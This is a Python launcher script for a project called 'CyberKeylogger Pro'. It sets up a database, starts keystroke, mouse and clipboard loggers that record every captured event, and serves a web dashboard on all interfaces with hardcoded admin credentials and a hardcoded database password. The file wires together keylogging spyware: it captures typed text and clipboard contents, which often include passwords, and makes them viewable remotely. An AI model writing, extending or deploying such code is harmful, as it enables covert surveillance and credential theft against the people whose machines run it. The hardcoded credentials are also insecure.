from server.webapp import create_app
from database.db_manager import DBManager
from database.models import DatabaseModels
import os
import sys

# Initialize database
def init_database():
    """Initialize database with tables and default data"""
    try:
        # Create data directory if it doesn't exist
        os.makedirs('data', exist_ok=True)
        
        # Initialize database models
        db_models = DatabaseModels('data/logs.db')
        print("Database initialized successfully")
        
    except Exception as e:
        print(f"Database initialization failed: {e}")
        sys.exit(1)

# Initialize the application
def init_app():
    """Initialize all application components"""
    print("Initializing CyberKeylogger Pro...")
    
    # Initialize database
    init_database()
    
    # Initialize database manager
    db_manager = DBManager('data/logs.db', 'password')
    
    # Logging services are optional and require pynput (which needs kernel headers)
    # In a web hosting environment, these won't work anyway
    try:
        from core.keylogger import KeyLogger
        from core.mouse_logger import MouseLogger
        from core.clipboard_logger import ClipboardLogger
        
        mouse_logger = MouseLogger(callback=lambda event: db_manager.insert_mouse_event(event))
        keystroke_logger = KeyLogger(callback=lambda event: db_manager.insert_keystroke(event))
        clipboard_logger = ClipboardLogger(callback=lambda event: db_manager.insert_clipboard(event))
        
        mouse_logger.start()
        keystroke_logger.start()
        clipboard_logger.start()
        print("Logging services started")
    except ImportError as e:
        print(f"Note: Logging services not available (pynput not installed): {e}")
        print("Web dashboard will run without local logging capabilities")
    except Exception as e:
        print(f"Warning: Some logging services failed to start: {e}")
    
    return db_manager

if __name__ == '__main__':
    # Initialize application
    db_manager = init_app()
    
    # Create Flask app
    app = create_app()
    
    # Run on port 5000 for Replit
    port = 5000
    print(f"Starting server on http://0.0.0.0:{port}")
    print("Dashboard: http://0.0.0.0:5000")
    print("Login with: superadmin_@gmail.com / P@$$word123")
    print("Press Ctrl+C to stop the server")
    
    try:
        app.run(debug=False, host='0.0.0.0', port=port)
    except KeyboardInterrupt:
        print("\nServer stopped by user")
    except Exception as e:
        print(f"Server error: {e}")
